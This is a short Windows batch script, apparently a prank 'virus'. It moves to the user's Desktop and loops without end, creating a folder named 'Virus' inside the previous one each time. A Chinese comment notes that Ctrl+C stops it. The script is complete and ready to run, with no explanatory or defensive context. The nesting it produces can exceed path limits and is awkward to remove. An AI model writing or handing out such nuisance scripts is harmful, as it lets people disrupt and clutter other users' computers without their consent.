@echo off
cd C:\Documents and Settings\%username%\Desktop
:loop
md Virus
cd Virus
goto loop

REM ctrl+c 结束
pause>nul
exit